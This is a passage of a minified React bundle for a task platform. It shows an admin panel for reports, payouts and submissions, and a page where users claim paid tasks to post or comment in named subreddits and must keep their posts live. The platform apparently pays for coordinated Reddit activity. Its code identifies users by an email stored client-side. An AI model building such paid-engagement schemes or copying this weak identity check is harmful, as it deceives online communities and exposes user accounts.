hover:border-red-600 transition-all flex items-center justify-center gap-2",children:[s.jsx($s,{size:16}),"RESOLVE"]})]})]})},p.id)):s.jsxs("div",{className:"py-20 text-center bg-white/[0.01] border border-dashed border-white/10 rounded-[32px]",children:[s.jsx(rs,{size:48,className:"mx-auto text-gray-700 mb-4"}),s.jsx("p",{className:"text-gray-500 font-bold uppercase tracking-widest text-xs",children:"No active reports. Everything is smooth!"})]})})]}):w==="Withdrawals"?s.jsxs("section",{className:"space-y-6 animate-in fade-in slide-in-from-right-4 duration-500",children:[s.jsxs("div",{className:"flex items-center justify-between mb-8",children:[s.jsx("h2",{className:"text-xl font-bold italic uppercase tracking-tight",children:"Completed Withdrawals"}),s.jsxs("div",{className:"px-4 py-2 bg-white/[0.03] border border-white/5 rounded-2xl",children:[s.jsx("span",{className:"text-[10px] font-black text-gray-500 uppercase tracking-widest",children:"Total Paid: "}),s.jsx("span",{className:"text-sm font-black text-white",children:x.filter(p=>p.status==="completed").length})]})]}),s.jsx("div",{className:"space-y-3",children:x.filter(p=>p.status==="completed").length>0?x.filter(p=>p.status==="completed").map(p=>{const O=new Date(p.created_at).toLocaleDateString([],{month:"short",day:"numeric",year:"numeric"}),L=h.find(W=>W.email===p.user_email);return s.jsxs("div",{className:"bg-white/[0.02] border border-white/5 p-5 rounded-3xl flex flex-col sm:flex-row items-center justify-between gap-4 group hover:border-emerald-500/20 transition-all",children:[s.jsxs("div",{className:"flex items-center gap-4 flex-1",children:[s.jsx("div",{className:"w-10 h-10 bg-emerald-500/10 rounded-xl flex items-center justify-center border border-emerald-500/20 text-emerald-500",children:s.jsx(jt,{size:18,strokeWidth:3})}),s.jsxs("div",{children:[s.jsxs("div",{className:"flex items-center gap-2 mb-0.5",children:[s.jsx("span",{className:"text-[10px] font-mono text-gray-500",children:p.transaction_id}),s.jsx("h4",{className:"text-sm font-bold text-white",children:L?.server_username||p.user_email.split("@")[0]})]}),s.jsxs("div",{className:"flex items-center gap-3",children:[s.jsx("span",{className:"text-[11px] font-bold text-gray-400",children:p.user_email}),s.jsx("span",{className:"text-gray-700 text-[10px]",children:""}),s.jsxs("span",{className:"text-[10px] font-bold text-gray-500 uppercase tracking-tight",children:["Paid on ",O]})]})]})]}),s.jsxs("div",{className:"flex items-center gap-6",children:[s.jsxs("div",{className:"text-right",children:[s.jsx("span",{className:"block text-[9px] font-black text-gray-600 uppercase tracking-widest mb-0.5",children:"Amount Paid"}),s.jsxs("span",{className:"text-sm font-black text-emerald-500",children:["$",p.amount.toFixed(2)]})]}),s.jsxs("div",{className:"text-right min-w-[120px]",children:[s.jsx("span",{className:"block text-[9px] font-black text-gray-600 uppercase tracking-widest mb-0.5",children:"Method"}),s.jsxs("div",{className:"flex items-center justify-end gap-2",children:[s.jsx("img",{src:cl[p.payout_method.type],alt:"",className:"w-3.5 h-3.5 object-contain"}),s.jsx("span",{className:"text-[10px] font-bold text-gray-300",children:p.payout_method.label})]})]})]})]},p.id)}):s.jsxs("div",{className:"py-20 text-center bg-white/[0.01] border border-dashed border-white/10 rounded-[32px]",children:[s.jsx(Hn,{size:48,className:"mx-auto text-gray-700 mb-4"}),s.jsx("p",{className:"text-gray-500 font-bold uppercase tracking-widest text-xs",children:"No completed withdrawals yet."})]})})]}):s.jsxs("section",{className:"space-y-6 animate-in fade-in slide-in-from-right-4 duration-500",children:[s.jsxs("div",{className:"flex items-center justify-between mb-8",children:[s.jsx("h2",{className:"text-xl font-bold italic uppercase tracking-tight",children:"Total Submission History"}),s.jsxs("div",{className:"px-4 py-2 bg-white/[0.03] border border-white/5 rounded-2xl",children:[s.jsx("span",{className:"text-[10px] font-black text-gray-500 uppercase tracking-widest",children:"Total: "}),s.jsx("span",{className:"text-sm font-black text-white",children:c.filter(p=>p.status!=="available").length})]})]}),s.jsx("div",{className:"space-y-3",children:c.filter(p=>p.status!=="available").length>0?c.filter(p=>p.status!=="available").map(p=>{const O=p.created_at?new Date(p.created_at).toLocaleDateString([],{month:"short",day:"numeric",year:"numeric"}):"---",L=h.find(W=>W.email===p.claimed_by);return s.jsxs("div",{className:"bg-white/[0.02] border border-white/5 p-5 rounded-3xl flex flex-col sm:flex-row items-center justify-between gap-4 group hover:border-blue-500/20 transition-all",children:[s.jsxs("div",{className:"flex items-center gap-4 flex-1",children:[s.jsx("div",{className:"w-10 h-10 bg-white/[0.03] rounded-xl flex items-center justify-center border border-white/5 text-gray-500 group-hover:text-blue-500 transition-colors",children:s.jsx(ss,{size:18})}),s.jsxs("div",{children:[s.jsxs("div",{className:"flex items-center gap-2 mb-0.5",children:[s.jsx("span",{className:"text-[10px] font-black text-blue-500",children:p.task_id_display}),s.jsx("h4",{className:"text-sm font-bold text-white",children:p.title}),s.jsx("span",{className:`text-[8px] font-black px-1.5 py-0.5 rounded uppercase ${p.tier==="Tier 3"?"bg-red-500/10 text-red-500":p.tier==="Tier 2"?"bg-amber-500/10 text-amber-500":"bg-emerald-500/10 text-emerald-500"}`,children:p.tier})]}),s.jsxs("div",{className:"flex items-center gap-3",children:[s.jsxs("span",{className:"text-[11px] font-bold text-gray-400",children:[L?.server_username||p.claimed_by?.split("@")[0],s.jsxs("span",{className:"text-gray-600 font-medium ml-1",children:["(u/",L?.reddit_username||"not_linked",")"]})]}),s.jsx("span",{className:"text-gray-700 text-[10px]",children:""}),s.jsx("span",{className:"text-[10px] font-bold text-gray-500 uppercase tracking-tight",children:O})]})]})]}),s.jsxs("div",{className:"flex items-center gap-6",children:[s.jsxs("div",{className:"text-right",children:[s.jsx("span",{className:"block text-[9px] font-black text-gray-600 uppercase tracking-widest mb-0.5",children:"Reward"}),s.jsx("span",{className:"text-sm font-black text-emerald-500",children:p.reward})]}),s.jsxs("div",{className:"text-right min-w-[100px]",children:[s.jsx("span",{className:"block text-[9px] font-black text-gray-600 uppercase tracking-widest mb-0.5",children:"Status"}),s.jsxs("div",{className:"flex items-center justify-end gap-1.5",children:[s.jsx("div",{className:`w-1.5 h-1.5 rounded-full ${p.status==="verified"?"bg-emerald-500":p.status==="submitted"?"bg-amber-500 animate-pulse":p.status==="rejected"?"bg-red-500":"bg-blue-500"}`}),s.jsx("span",{className:`text-[10px] font-black uppercase tracking-widest ${p.status==="verified"?"text-emerald-500":p.status==="submitted"?"text-amber-500":p.status==="rejected"?"text-red-500":"text-blue-500"}`,children:p.status})]})]})]})]},p.id)}):s.jsxs("div",{className:"py-20 text-center bg-white/[0.01] border border-dashed border-white/10 rounded-[32px]",children:[s.jsx(at,{size:48,className:"mx-auto text-gray-700 mb-4"}),s.jsx("p",{className:"text-gray-500 font-bold uppercase tracking-widest text-xs",children:"No submissions recorded yet."})]})})]}),s.jsxs("section",{className:"mt-20 p-8 border border-dashed border-white/10 rounded-[32px] bg-white/[0.01]",children:[s.jsx("h2",{className:"text-sm font-bold text-gray-500 uppercase tracking-[0.2em] mb-4",children:"Security Notice"}),s.jsx("p",{className:"text-xs text-gray-600 leading-relaxed",children:"This admin panel is restricted to authorized personnel. All task distributions are logged with your IP address and timestamp. Ensure all target URLs comply with the network's safety guidelines before publishing."})]}),T&&s.jsx("div",{className:"fixed inset-0 z-[200] flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm animate-in fade-in duration-300",children:s.jsxs("div",{className:"w-full max-w-lg bg-[#0a0a0a] border border-white/10 rounded-[40px] p-8 sm:p-12 shadow-2xl animate-in zoom-in duration-300",children:[s.jsxs("div",{className:"flex flex-col items-center text-center mb-8",children:[s.jsx("div",{className:"w-16 h-16 bg-blue-600/10 rounded-2xl flex items-center justify-center mb-6 border border-blue-500/20",children:s.jsx(Er,{className:"text-blue-500",size:32})}),s.jsx("h2",{className:"text-2xl font-black tracking-tight mb-2 uppercase italic",children:"Send Admin Alert"}),s.jsxs("p",{className:"text-gray-500 text-sm",children:["To: ",s.jsx("span",{className:"text-blue-400 font-bold",children:z})]})]}),s.jsxs("div",{className:"space-y-6",children:[s.jsxs("div",{className:"space-y-3",children:[s.jsx("label",{className:"text-xs font-bold text-gray-500 uppercase tracking-widest ml-1",children:"Message Content"}),s.jsx("textarea",{rows:4,autoFocus:!0,placeholder:"Enter the alert or update details for the user...",value:H,onChange:p=>te(p.target.value),className:"w-full px-6 py-5 bg-white/[0.03] border border-white/5 rounded-3xl focus:outline-none focus:border-blue-500 transition-all text-sm placeholder:text-gray-600 resize-none shadow-inner"})]}),s.jsxs("div",{className:"flex gap-4",children:[s.jsx("button",{onClick:()=>D(!1),className:"flex-1 py-4 bg-white/[0.03] border border-white/10 text-gray-400 rounded-2xl font-bold text-sm hover:text-white hover:bg-white/5 transition-all",children:"Cancel"}),s.jsx("button",{onClick:Xn,disabled:!H.trim()||J,className:"flex-1 py-4 bg-blue-600 text-white rounded-2xl font-black text-sm hover:bg-blue-700 transition-all shadow-lg shadow-blue-600/20 flex items-center justify-center gap-2 group disabled:opacity-50 disabled:cursor-not-allowed",children:J?"Sending...":s.jsxs(s.Fragment,{children:["Send Alert",s.jsx(Vn,{size:18,className:"group-hover:translate-x-1 group-hover:-translate-y-1 transition-transform"})]})})]})]})]})}),ne&&Ee&&s.jsx("div",{className:"fixed inset-0 z-[200] flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm animate-in fade-in duration-300",children:s.jsxs("div",{className:"w-full max-w-lg bg-[#0a0a0a] border border-white/10 rounded-[40px] p-8 sm:p-12 shadow-2xl animate-in zoom-in duration-300",children:[s.jsxs("div",{className:"flex flex-col items-center text-center mb-8",children:[s.jsx("div",{className:"w-16 h-16 bg-red-600/10 rounded-2xl flex items-center justify-center mb-6 border border-red-500/20",children:s.jsx(De,{className:"text-red-500",size:32})}),s.jsx("h2",{className:"text-2xl font-black tracking-tight mb-2 uppercase italic",children:"Reject Submission"}),s.jsxs("p",{className:"text-gray-500 text-sm",children:["Task: ",s.jsx("span",{className:"text-red-400 font-bold",children:Ee.title})]}),s.jsxs("p",{className:"text-gray-600 text-xs mt-1",children:["User: ",Ee.claimed_by]})]}),s.jsxs("div",{className:"space-y-6",children:[s.jsxs("div",{className:"space-y-3",children:[s.jsx("label",{className:"text-xs font-bold text-gray-500 uppercase tracking-widest ml-1",children:"Rejection Reason"}),s.jsx("textarea",{rows:4,autoFocus:!0,placeholder:"Enter the reason for rejection...",value:Fe,onChange:p=>Re(p.target.value),className:"w-full px-6 py-5 bg-white/[0.03] border border-white/5 rounded-3xl focus:outline-none focus:border-red-500 transition-all text-sm placeholder:text-gray-600 resize-none shadow-inner"})]}),s.jsxs("div",{className:"flex gap-4",children:[s.jsx("button",{onClick:()=>{ue(!1),ze(null),Re("")},className:"flex-1 py-4 bg-white/[0.03] border border-white/10 text-gray-400 rounded-2xl font-bold text-sm hover:text-white hover:bg-white/5 transition-all",children:"Cancel"}),s.jsx("button",{onClick:Ms,disabled:!Fe.trim()||de,className:"flex-1 py-4 bg-red-600 text-white rounded-2xl font-black text-sm hover:bg-red-700 transition-all shadow-lg shadow-red-600/20 flex items-center justify-center gap-2 group disabled:opacity-50 disabled:cursor-not-allowed",children:de?"Rejecting...":s.jsxs(s.Fragment,{children:["Reject Task",s.jsx(De,{size:18,strokeWidth:3})]})})]})]})]})}),we&&U&&s.jsx("div",{className:"fixed inset-0 z-[200] flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm animate-in fade-in duration-300",children:s.jsxs("div",{className:"w-full max-w-lg bg-[#0a0a0a] border border-white/10 rounded-[40px] p-8 sm:p-12 shadow-2xl animate-in zoom-in duration-300",children:[s.jsxs("div",{className:"flex flex-col items-center text-center mb-8",children:[s.jsx("div",{className:"w-16 h-16 bg-emerald-600/10 rounded-2xl flex items-center justify-center mb-6 border border-emerald-500/20",children:s.jsx(Os,{className:"text-emerald-500",size:32})}),s.jsx("h2",{className:"text-2xl font-black tracking-tight mb-2 uppercase italic",children:"Confirm Payout"}),s.jsxs("p",{className:"text-gray-500 text-sm",children:["Transaction ID: ",s.jsx("span",{className:"text-blue-400 font-mono font-bold",children:U.transaction_id})]}),s.jsxs("div",{className:"mt-4 p-4 bg-white/[0.02] border border-white/5 rounded-2xl w-full text-left",children:[s.jsxs("div",{className:"flex justify-between items-center mb-3",children:[s.jsx("span",{className:"text-xs font-bold text-gray-500 uppercase",children:"Amount to Pay"}),s.jsxs("span",{className:"text-xl font-black text-emerald-500",children:["$",U.amount.toFixed(2)]})]}),s.jsxs("div",{className:"space-y-2",children:[s.jsx("span",{className:"text-[10px] font-bold text-gray-600 uppercase tracking-widest block",children:"Recipient Details"}),s.jsxs("div",{className:"flex items-center gap-3 p-3 bg-black/40 rounded-xl border border-white/5",children:[s.jsx("img",{src:cl[U.payout_method.type],alt:"",className:"w-5 h-5 object-contain"}),s.jsxs("div",{className:"min-w-0",children:[s.jsx("p",{className:"text-[10px] font-black text-gray-400 uppercase leading-none mb-1",children:U.payout_method.label}),s.jsx("p",{className:"text-xs font-bold text-white truncate",children:U.payout_method.value})]})]})]})]})]}),s.jsxs("div",{className:"flex gap-4",children:[s.jsx("button",{onClick:()=>{he(!1),Z(null)},className:"flex-1 py-4 bg-white/[0.03] border border-white/10 text-gray-400 rounded-2xl font-bold text-sm hover:text-white hover:bg-white/5 transition-all",children:"Cancel"}),s.jsx("button",{onClick:Qn,disabled:ee,className:"flex-1 py-4 bg-emerald-600 text-white rounded-2xl font-black text-sm hover:bg-emerald-700 transition-all shadow-lg shadow-emerald-600/20 flex items-center justify-center gap-2 group disabled:opacity-50",children:ee?"Processing...":s.jsxs(s.Fragment,{children:["Confirm & Pay",s.jsx(jt,{size:18,strokeWidth:3})]})})]})]})})]})]}):s.jsxs(ns,{children:[s.jsx("div",{className:`fixed top-6 left-6 right-6 md:left-auto md:right-10 z-[100] pointer-events-none flex justify-center md:justify-end transition-all duration-300 transform ${Ue.show?"opacity-100 translate-y-0 scale-100":"opacity-0 -translate-y-4 scale-95"}`,children:s.jsxs("div",{className:`flex items-center justify-between gap-4 px-8 py-5 rounded-[24px] border backdrop-blur-2xl shadow-[0_20px_50px_rgba(0,0,0,0.3)] pointer-events-auto min-w-[280px] max-w-[90vw] md:max-w-md ${Ue.type==="success"?"bg-emerald-500/15 border-emerald-500/30 text-emerald-400":Ue.type==="error"?"bg-red-500/15 border-red-500/30 text-red-400":"bg-blue-500/15 border-blue-500/30 text-blue-400"}`,children:[s.jsxs("div",{className:"flex items-center gap-4",children:[s.jsx("div",{className:"flex-shrink-0",children:Ue.type==="success"?s.jsx(jt,{size:24,strokeWidth:3}):Ue.type==="error"?s.jsx(De,{size:24,strokeWidth:3}):s.jsx(at,{size:24,strokeWidth:3})}),s.jsx("span",{className:"font-bold text-base tracking-tight leading-tight",children:Ue.message})]}),s.jsx("button",{onClick:()=>Wt(p=>({...p,show:!1})),className:"flex-shrink-0 ml-2 p-1 hover:bg-white/10 rounded-full transition-colors",children:s.jsx(De,{size:18,strokeWidth:3})})]})}),s.jsx("div",{className:"min-h-[70vh] flex items-center justify-center p-4",children:s.jsxs("div",{className:"w-full max-w-md bg-white/[0.02] border border-white/5 rounded-[32px] p-8 sm:p-10 backdrop-blur-xl animate-in fade-in zoom-in duration-300",children:[s.jsxs("div",{className:"flex flex-col items-center text-center mb-8",children:[s.jsx("div",{className:"w-16 h-16 bg-blue-600/10 rounded-2xl flex items-center justify-center mb-6 border border-blue-500/20",children:s.jsx(Ds,{className:"text-blue-500",size:32})}),s.jsx("h1",{className:"text-2xl font-black tracking-tight mb-2",children:"Admin Access"}),s.jsx("p",{className:"text-gray-500 text-sm",children:"Enter the admin passcode to continue."})]}),s.jsxs("form",{onSubmit:Or,className:"space-y-6",children:[s.jsx("div",{className:"space-y-2",children:s.jsxs("div",{className:"relative group",children:[s.jsx(Nr,{className:"absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 group-focus-within:text-blue-500 transition-colors",size:20}),s.jsx("input",{type:"password",placeholder:"",value:a,onChange:p=>r(p.target.value),className:"w-full pl-12 pr-4 py-4 bg-white/[0.03] border border-white/5 rounded-2xl focus:outline-none focus:border-blue-500 transition-all text-center tracking-[0.5em] font-mono text-lg"})]})}),s.jsx("button",{type:"submit",className:"w-full py-4 bg-blue-600 text-white rounded-2xl font-black text-sm hover:bg-blue-700 transition-all shadow-lg shadow-blue-600/20 active:scale-[0.98]",children:"ACCESS PANEL"})]})]})})]})},av=()=>{const{id:a}=w0(),r=ur(),[n,l]=j.useState(null),[c,u]=j.useState(!0),[h,m]=j.useState(!1),[x,y]=j.useState(""),[v,k]=j.useState(""),[_,S]=j.useState(["","","","",""]),[w,E]=j.useState({show:!1,message:"",type:"info"}),[T,D]=j.useState(""),[z,I]=j.useState(!1),[H,te]=j.useState(!1),J=(de,ae="info")=>{E({show:!0,message:de,type:ae}),setTimeout(()=>E(we=>({...we,show:!1})),2e3)};j.useEffect(()=>{F(),ne()},[a]);const F=async()=>{const{data:de,error:ae}=await X.from("tasks").select("*").eq("id",a).single();de&&l(de),u(!1)},ne=async()=>{const de=Zt("user_email")||localStorage.getItem("user_email");if(!de)return;const{data:ae}=await X.from("profiles").select("reddit_username").eq("email",de).single();ae&&y(ae.reddit_username)},ue=async()=>{const de=Zt("user_email")||localStorage.getItem("user_email");if(!de)return;if(!x||x==="not_connected"||!x.trim()){J("You must link a valid Reddit account in your Profile settings to claim tasks.","error"),setTimeout(()=>r("/account"),2e3);return}const{data:ae}=await X.from("profiles").select("last_task_completed_at, last_task_rejected_at").eq("email",de).single();if(ae){const he=new Date;if(ae.last_task_completed_at){const U=new Date(ae.last_task_completed_at),Z=(he.getTime()-U.getTime())/(1e3*60*60);if(Z<2){const ee=Math.ceil((2-Z)*60);J(`Please wait ${ee} minutes before claiming another task.`,"error");return}}if(ae.last_task_rejected_at){const U=new Date(ae.last_task_rejected_at),Z=(he.getTime()-U.getTime())/(1e3*60*60);if(Z<1){const ee=Math.ceil((1-Z)*60);J(`Please wait ${ee} minutes before claiming another task (previous rejection cooldown).`,"error");return}}}m(!0);const{error:we}=await X.from("tasks").update({status:"claimed",claimed_by:de}).eq("id",a).eq("status","available");we?J("Error claiming task: "+we.message,"error"):(J("Task claimed! You can now start working.","success"),F()),m(!1)},Ee=(de,ae)=>{const we=de.toLowerCase().trim();if(!(we.includes("reddit.com/r/")||we.startsWith("r/")))return!1;if(ae){const U=`/r/${ae.toLowerCase()}`;return we.includes(U)}return!0},ze=async()=>{if(!T.trim())return;I(!0);const de=Zt("user_email")||localStorage.getItem("user_email"),{error:ae}=await X.from("admin_alerts").insert([{user_email:"ADMIN_REPORT",message:`FROM: ${de} | TASK: ${n?.task_id_display} | PROBLEM: ${T}`}]);ae?J("Error sending report: "+ae.message,"error"):(J("Report sent to admins. We will look into it.","success"),D("")),I(!1)},Fe=async()=>{if(!v){J("Please enter the main task link.","error");return}if(!Ee(v,n?.subreddit||"")){v.toLowerCase().includes("reddit.com/r/")?J(`This task requires a link specifically from r/${n?.subreddit}.`,"error"):J("Please enter a valid Reddit link (e.g., https://reddit.com/r/...)","error");return}if(n?.tier?.includes("Tier 3")){if(!_.every(we=>we&&we.trim()!=="")){J("Tier 3 tasks require all 5 random comment links to be filled.","error");return}if(new Set(_.filter(we=>we.trim()!=="")).size!==5){J("All 5 random comment links must be unique.","error");return}}te(!0)},Re=async()=>{m(!0),te(!1);const de=Zt("user_email")||localStorage.getItem("user_email");if(!de){J("Session expired. Please log in again.","error"),m(!1);return}try{const{error:ae}=await X.from("tasks").update({status:"submitted",submission_data:{main_link:v.trim(),random_comments:_.map(we=>we.trim()).filter(we=>we!==""),submitted_at:new Date().toISOString()}}).eq("id",a).eq("claimed_by",de);ae?(console.error("Submission error:",ae),J("Error submitting task: "+ae.message,"error")):(J("Task submitted successfully! Awaiting verification.","success"),F())}catch(ae){console.error("Unexpected submission error:",ae),J("An unexpected error occurred during submission.","error")}finally{m(!1)}};return c?s.jsx("div",{className:"min-h-screen bg-black flex items-center justify-center text-blue-500 font-bold",children:"Loading Task..."}):n?s.jsx(ns,{children:s.jsxs("div",{className:"animate-in fade-in slide-in-from-bottom-4 duration-300",children:[s.jsx("div",{className:`fixed top-6 left-6 right-6 md:left-auto md:right-10 z-[100] pointer-events-none flex justify-center md:justify-end transition-all duration-300 transform ${w.show?"opacity-100 translate-y-0 scale-100":"opacity-0 -translate-y-4 scale-95"}`,children:s.jsx("div",{className:`flex items-center justify-between gap-4 px-8 py-5 rounded-[24px] border backdrop-blur-2xl shadow-[0_20px_50px_rgba(0,0,0,0.3)] pointer-events-auto min-w-[280px] max-w-[90vw] md:max-w-md ${w.type==="success"?"bg-emerald-500/15 border-emerald-500/30 text-emerald-400":w.type==="error"?"bg-red-500/15 border-red-500/30 text-red-400":"bg-blue-500/15 border-blue-500/30 text-blue-400"}`,children:s.jsxs("div",{className:"flex items-center gap-4",children:[s.jsx("div",{className:"flex-shrink-0",children:w.type==="success"?s.jsx(rs,{size:24,strokeWidth:3}):w.type==="error"?s.jsx(De,{size:24,strokeWidth:3}):s.jsx(at,{size:24,strokeWidth:3})}),s.jsx("span",{className:"font-bold text-base tracking-tight leading-tight",children:w.message})]})})}),s.jsxs("div",{className:"max-w-4xl mx-auto py-8 px-4 sm:px-6",children:[s.jsxs("button",{onClick:()=>r("/tasks"),className:"flex items-center gap-2 text-gray-500 hover:text-white transition-all mb-8 group",children:[s.jsx(fl,{size:18,className:"group-hover:-translate-x-1 transition-transform"}),s.jsx("span",{className:"font-bold text-sm",children:"Back to Tasks"})]}),s.jsxs("div",{className:"flex flex-col md:flex-row md:items-start justify-between gap-6 mb-8",children:[s.jsxs("div",{className:"space-y-4",children:[s.jsxs("div",{className:"flex items-center gap-2 text-gray-400",children:[s.jsx(Er,{size:16}),s.jsx("span",{className:"text-[10px] font-black uppercase tracking-widest",children:n.category||"Reddit Task"})]}),s.jsxs("h1",{className:"text-4xl font-black tracking-tighter uppercase italic flex items-center gap-4",children:["Task ",n.task_id_display,s.jsx("span",{className:`text-xs not-italic font-black px-3 py-1 rounded-lg ${n.tier==="Tier 3"?"bg-red-500/10 text-red-500 border border-red-500/20":n.tier==="Tier 2"?"bg-amber-500/10 text-amber-500 border border-amber-500/20":"bg-emerald-500/10 text-emerald-500 border border-emerald-500/20"}`,children:n.tier})]}),s.jsx("div",{className:"flex items-center gap-4",children:s.jsxs("div",{className:"flex items-center gap-2 px-3 py-1.5 bg-white/[0.03] border border-white/5 rounded-xl",children:[s.jsx("div",{className:"w-5 h-5 bg-[#FF4500] rounded-full flex items-center justify-center",children:s.jsx("svg",{viewBox:"0 0 24 24",className:"w-3 h-3 fill-white",xmlns:"http://www.w3.org/2000/svg",children:s.jsx("path",{d:"M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.051l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.945 0 1.712.767 1.712 1.712 0 .593-.306 1.11-.764 1.398.032.183.051.369.051.563 0 2.315-2.72 4.192-6.075 4.192-3.354 0-6.074-1.877-6.074-4.192 0-.194.02-.38.051-.563a1.712 1.712 0 0 1-1.114-2.622c.307-.31.73-.491 1.207-.491.478 0 .901.182 1.207.491 1.194-.856 2.85-1.419 4.674-1.488l.82-3.818a.312.312 0 0 1 .37-.243l2.672.567c.058-.051.126-.093.197-.122zm-6.11 7.115c-.631 0-1.145.513-1.145 1.145s.514 1.145 1.145 1.145c.632 0 1.145-.513 1.145-1.145s-.513-1.145-1.145-1.145zm4.22 0c-.632 0-1.145.513-1.145 1.145s.513 1.145 1.145 1.145c.631 0 1.145-.513 1.145-1.145s-.514-1.145-1.145-1.145zm-4.22 3.183c-.11 0-.213.044-.29.121-.423.422-1.328.462-1.62.462a.41.31 0 1 0 0 .82c.728 0 1.938-.11 2.546-.718a.41.41 0 0 0-.636-.585zm4.22 0c-.11 0-.213.044-.29.121-.423.422-1.328.462-1.62.462a.41.31 0 1 0 0 .82c.728 0 1.938-.11 2.546-.718a.41.41 0 0 0-.636-.585z"})})}),s.jsxs("span",{className:"text-xs font-bold text-white",children:["u/",x||"Account"]}),s.jsx("span",{className:"text-gray-600 text-[10px]",children:""}),s.jsx("span",{className:"text-[10px] text-gray-500 font-bold",children:"Task accepted with this account"})]})}),s.jsx("div",{className:"flex items-center gap-4 text-gray-500",children:s.jsxs("div",{className:"flex items-center gap-1.5 text-xs font-bold",children:[s.jsx(Fr,{size:14}),"Deadline: ",new Date(n.deadline).toLocaleString([],{dateStyle:"medium",timeStyle:"short"})]})})]}),s.jsxs("div",{className:"bg-emerald-500/10 border border-emerald-500/20 px-8 py-4 rounded-2xl flex flex-col items-center",children:[s.jsxs("span",{className:"text-3xl font-black text-emerald-500",children:["$",n.reward]}),s.jsx("span",{className:"text-[10px] font-black uppercase tracking-widest text-emerald-500/60 mt-1",children:"Reward"})]})]}),s.jsxs("div",{className:"p-6 bg-red-500/5 border border-red-500/20 rounded-3xl flex gap-4 items-start mb-8 animate-in fade-in slide-in-from-top-4 duration-500",children:[s.jsx("div",{className:"w-10 h-10 bg-red-500/10 rounded-2xl flex items-center justify-center shrink-0 border border-red-500/20",children:s.jsx(at,{className:"text-red-500",size:24})}),s.jsxs("div",{children:[s.jsx("h3",{className:"font-black text-red-500 text-sm uppercase tracking-wider mb-1",children:"Important Warning"}),s.jsxs("p",{className:"text-sm leading-relaxed text-gray-400",children:["Deleting your post/comment after receiving payment will result in a ",s.jsx("span",{className:"text-red-500 font-bold",children:"permanent ban"})," from the platform. Keep your submissions live to maintain eligibility."]})]})]}),n.status==="claimed"&&s.jsxs("div",{className:"p-6 bg-white/[0.02] border border-white/5 rounded-3xl flex items-center gap-4 mb-12 animate-in fade-in zoom-in",children:[s.jsx("div",{className:"w-10 h-10 bg-emerald-500/10 rounded-2xl flex items-center justify-center shrink-0 border border-emerald-500/20",children:s.jsx(rs,{className:"text-emerald-500",size:24})}),s.jsxs("div",{className:"flex-1",children:[s.jsx("h3",{className:"font-bold text-white text-sm",children:"Task Claimed"}),s.jsx("p",{className:"text-xs text-gray-500",children:"You've claimed this task. Complete it to earn your reward."})]})]}),n.status==="submitted"&&s.jsxs("div",{className:"p-6 bg-amber-500/5 border border-amber-500/20 rounded-3xl flex items-center gap-4 mb-12 animate-in fade-in zoom-in",children:[s.jsx("div",{className:"w-10 h-10 bg-amber-500/10 rounded-2xl flex items-center justify-center shrink-0 border border-amber-500/20",children:s.jsx(at,{className:"text-amber-500",size:24})}),s.jsxs("div",{children:[s.jsx("h3",{className:"font-bold text-amber-500 text-sm",children:"Pending Verification"}),s.jsx("p",{className:"text-xs text-gray-500",children:"Your submission is being reviewed by admins."})]})]}),n.status==="verified"&&s.jsxs("div",{className:"p-6 bg-emerald-500/5 border border-emerald-500/20 rounded-3xl flex items-center gap-4 mb-12 animate-in fade-in zoom-in",children:[s.jsx("div",{className:"w-10 h-10 bg-emerald-500/10 rounded-2xl flex items-center justify-center shrink-0 border border-emerald-500/20",children:s.jsx(rs,{className:"text-emerald-500",size:24})}),s.jsxs("div",{children:[s.jsx("h3",{className:"font-bold text-emerald-500 text-sm",children:"Task Completed"}),s.jsx("p",{className:"text-xs text-gray-500",children:"Reward has been added to your wallet."})]})]}),n.status==="available"&&s.jsxs("div",{className:"mb-12",children:[s.jsxs("button",{onClick:ue,disabled:h,className:"w-full py-5 bg-blue-600 text-white rounded-[32px] font-black text-lg hover:bg-blue-700 transition-all shadow-2xl shadow-blue-600/40 flex items-center justify-center gap-3 group disabled:opacity-50",children:[h?"Claiming...":"Claim This Task",!h&&s.jsx(fl,{size:20,className:"rotate-180 group-hover:translate-x-1 transition-transform"})]}),s.jsx("p",{className:"text-center text-gray-600 text-[10px] mt-4 uppercase font-bold tracking-widest",children:"Only one person can claim this task at a time."})]}),(n.status==="claimed"||n.status==="submitted"||n.status==="verified")&&s.jsxs("div",{className:"grid grid-cols-1 lg:grid-cols-3 gap-12 mb-16",children:[s.jsxs("div",{className:"lg:col-span-2 space-y-8",children:[s.jsx("h2",{className:"text-xl font-black uppercase italic tracking-tighter",children:"Instructions"}),s.jsxs("div",{className:"space-y-6",children:[s.jsxs("div",{className:"flex gap-6 items-start group",children:[s.jsx("div",{className:"w-10 h-10 bg-emerald-500 text-black font-black flex items-center justify-center rounded-xl shrink-0 text-xl shadow-lg shadow-emerald-500/20",children:"1"}),s.jsxs("div",{className:"pt-1",children:[s.jsxs("div",{className:"flex items-center gap-3 mb-2",children:[s.jsx("span",{className:"text-sm font-black text-blue-500 uppercase tracking-widest",children:"Step 1"}),s.jsx("div",{className:"h-[1px] w-12 bg-white/10"}),s.jsxs("span",{className:"text-xs font-bold text-gray-500 flex items-center gap-2 italic",children:[s.jsx(Ds,{size:12})," r/",n.subreddit||"Reddit"]})]}),s.jsx("h3",{className:"text-xl font-bold text-white mb-2",children:"Join the Subreddit First"}),s.jsx("p",{className:"text-sm text-gray-500 mb-4 max-w-lg",children:"Go to the target subreddit and make sure you are joined before participating."}),s.jsxs("a",{href:n.reddit_url,target:"_blank",rel:"noreferrer",className:"inline-flex items-center gap-2 px-4 py-2 bg-[#FF4500] text-white rounded-xl text-xs font-black uppercase tracking-widest hover:bg-[#ff5722] transition-all shadow-lg shadow-[#FF4500]/20",children:["Go to Subreddit ",s.jsx(Fa,{size:14})]})]})]}),s.jsxs("div",{className:"flex gap-6 items-start group",children:[s.jsx("div",{className:"w-10 h-10 bg-blue-600 text-white font-black flex items-center justify-center rounded-xl shrink-0 text-xl shadow-lg shadow-blue-600/20",children:"2"}),s.jsxs("div",{className:"pt-1 w-full",children:[s.jsxs("div",{className:"flex items-center gap-3 mb-2",children:[s.jsx("span",{className:"text-sm 